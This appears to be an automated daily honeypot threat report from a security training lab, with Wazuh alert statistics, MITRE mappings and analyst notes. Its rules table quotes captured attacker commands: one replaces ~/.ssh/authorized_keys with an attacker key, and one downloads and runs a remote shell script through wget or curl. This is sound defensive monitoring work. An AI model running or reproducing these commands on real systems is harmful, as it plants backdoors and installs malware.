# LearningLab01 Daily Threat Intelligence Report — 2026-10-24

Generated: 2026-10-24T13:15:05.053Z

Report window: 2026-10-23T13:15:05.026Z through 2026-10-24T13:15:05.026Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 128,630 |
| Attack-related alerts | 19,543 |
| Honeypot interactions | 112,561 |
| Authentication failures | 5,221 |
| Authentication successes | 663 |
| Critical alerts | 430 |
| High alerts | 815 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 430 critical-severity alerts require priority review.
- 815 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 7.87:1.
- Country attribution currently covers only 0.09% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110207: T-Pot SentryPeer SIP activity from [IP address]:62766, method INVITE (53,108 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 430 | 0.33% |
| High | 815 | 0.63% |
| Medium | 3,263 | 2.54% |
| Low | 124,122 | 96.50% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 5,221
- Authentication successes: 663
- Failure-to-success ratio: 7.87:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,757 | 49.93% |
| Payload delivery | 9,757 | 49.93% |
| Authentication failure | 5,221 | 26.72% |
| Command execution | 3,160 | 16.17% |
| Web attack | 419 | 2.14% |
| Malware | 317 | 1.62% |
| Reconnaissance | 240 | 1.23% |
| Network scan | 107 | 0.55% |
| SMTP attack | 85 | 0.43% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 116 alerts, representing 0.09% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 128,514 | 99.91% | Not geolocated |
| United Kingdom | 57 | 0.04% | ████████████████████ |
| Bulgaria | 20 | 0.02% | ███████ |
| Germany | 15 | 0.01% | █████ |
| Azerbaijan | 12 | 0.01% | ████ |
| Romania | 12 | 0.01% | ████ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 71 |
| Execution | 23 |
| Impact | 12 |
| Command and Control | 5 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 71 |
| Command and Scripting Interpreter | 23 |
| Stored Data Manipulation | 12 |
| Ingress Tool Transfer | 5 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110207 | 5 | 53,108 | T-Pot SentryPeer SIP activity from [IP address]:62766, method INVITE | tpot (53,108) |
| 110213 | 4 | 25,141 | T-Pot RDP connection from [IP address] to port 3389. | tpot (25,141) |
| 110204 | 4 | 22,843 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (22,843) |
| 110205 | 6 | 9,703 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,703) |
| 110101 | 3 | 6,172 | Cowrie SSH connection from [IP address]. | tpot (6,172) |
| 110102 | 5 | 5,221 | Cowrie failed login from [IP address] using username root. | tpot (5,221) |
| 110104 | 7 | 2,702 | Cowrie captured a command from [IP address]: g & k \| zpkfq | tpot (2,702) |
| 110201 | 4 | 686 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (686) |
| 110109 | 13 | 430 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (430) |
| 110223 | 5 | 419 | T-Pot HoneyAML received  request from  to  on port . | tpot (419) |
| 110103 | 10 | 372 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (372) |
| 110105 | 12 | 289 | Cowrie captured a file download from [IP address]. | tpot (289) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 174 | PAM: Login session closed. | tpot (172), wazuh (2) |
| 110209 | 5 | 133 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (133) |
| 110216 | 4 | 105 | T-Pot Mailoney received SMTP command from [IP address]: EHLO [IP address]  | tpot (105) |
| 110214 | 9 | 104 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (104) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110217 | 7 | 85 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (85) |
| 110219 | 4 | 78 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html HTTP/1.1" 302 - | tpot (78) |
| 110106 | 10 | 71 | Cowrie detected repeated failed logins from [IP address]. | tpot (71) |
| 110212 | 10 | 54 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (54) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110215 | 4 | 37 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (37) |
| 110221 | 7 | 24 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (24) |
| 110108 | 12 | 23 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (23) |
| 110208 | 7 | 23 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:21160 | tpot (23) |
| 110220 | 8 | 14 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (14) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 202 | 7 | 6 | Agent event queue is 90% full. | tpot (6) |
| 203 | 9 | 6 | Agent event queue is full. Events may be lost. | tpot (6) |
| 205 | 3 | 6 | Agent event queue is back to normal load. | tpot (6) |
| 110107 | 12 | 5 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (5) |
| 110211 | 9 | 3 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 550 | 7 | 1 | Integrity checksum changed. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
